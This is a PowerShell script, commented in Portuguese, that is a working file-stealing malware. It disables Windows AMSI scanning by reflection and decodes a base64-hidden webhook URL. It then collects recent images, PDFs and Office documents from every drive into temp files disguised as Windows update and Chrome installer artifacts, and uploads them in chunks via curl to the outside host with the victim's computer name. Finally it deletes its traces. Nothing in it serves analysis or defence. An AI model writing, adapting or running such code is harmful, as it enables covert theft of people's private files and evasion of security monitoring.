# [Bypass AMSI Ultra-Ofuscado]
$m=[Ref].Assembly.GetTypes()|Where-Object {$_.Name -like "*AmsiUtils*"}
$m.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 1. Configurações (Password para o ZIP: Manso2026!)
$wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

$tempDir = "$env:TEMP\win_update_$(Get-Random)"
$exclude = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 2. Busca e Cópia (Filtro 30 dias / <15MB)
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.FullName
        $skip = $false; foreach($d in $exclude){if($p.StartsWith($d)){$skip=$true;break}}
        !$skip -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
    } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
}

# 3. Compactação e Fragmentação com Delay (8MB por parte)
$zipFile = "$env:TEMP\chrome_installer.exe.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    $fileStream = [System.IO.File]::OpenRead($zipFile)
    $buffer = New-Object byte[] 8MB
    $part = 1
    while ($bytes = $fileStream.Read($buffer, 0, $buffer.Length)) {
        $pPath = "$zipFile.p$part"
        [System.IO.File]::WriteAllBytes($pPath, $buffer[0..($bytes - 1)])
        curl.exe -k -s -F "file=@$pPath" -F "content=Parte $part - $env:COMPUTERNAME" $u
        Remove-Item $pPath
        $part++
        Start-Sleep -Seconds 5 
    }
    $fileStream.Close()
}

# 4. Auto-Destruição
Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
